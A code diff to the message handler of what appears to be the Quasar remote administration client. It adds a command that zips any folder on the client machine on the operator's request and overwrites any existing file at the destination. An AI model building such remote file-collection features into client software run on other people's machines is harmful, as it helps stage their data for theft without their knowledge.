@@ -12,6 +12,7 @@ using Quasar.Common.Networking;
 using System;
 using System.Collections.Concurrent;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Security;
 using System.Threading;
@@ -60,7 +61,8 @@ namespace Quasar.Client.Messages
                                                              message is FileTransferCancel ||
                                                              message is FileTransferChunk ||
                                                              message is DoPathDelete ||
-                                                             message is DoPathRename;
+                                                             message is DoPathRename ||
+                                                             message is DoZipFolder;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -89,6 +91,41 @@ namespace Quasar.Client.Messages
                 case DoPathRename msg:
                     Execute(sender, msg);
                     break;
+                case DoZipFolder msg:
+                    HandleDoZipFile(sender, msg);
+                    break;
+            }
+        }
+        private void HandleDoZipFile(ISender client, DoZipFolder message)
+        {
+            try
+            {
+                if (!Directory.Exists(message.SourcePath))
+                {
+                    client.Send(new SetStatusFileManager { Message = $"Directory not found: {message.SourcePath}" });
+                    return;
+                }
+
+                client.Send(new SetStatusFileManager { Message = $"Creating zip archive: {message.DestinationPath}" });
+
+                string parentDir = Path.GetDirectoryName(message.DestinationPath);
+                if (!Directory.Exists(parentDir))
+                    Directory.CreateDirectory(parentDir);
+
+                if (File.Exists(message.DestinationPath))
+                    File.Delete(message.DestinationPath);
+
+                ZipFile.CreateFromDirectory(
+                    message.SourcePath,
+                    message.DestinationPath,
+                    (CompressionLevel)message.CompressionLevel,
+                    includeBaseDirectory: false);
+
+                client.Send(new SetStatusFileManager { Message = $"Successfully created zip: {message.DestinationPath}" });
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatusFileManager { Message = $"Error creating zip: {ex.Message}" });
             }
         }
 
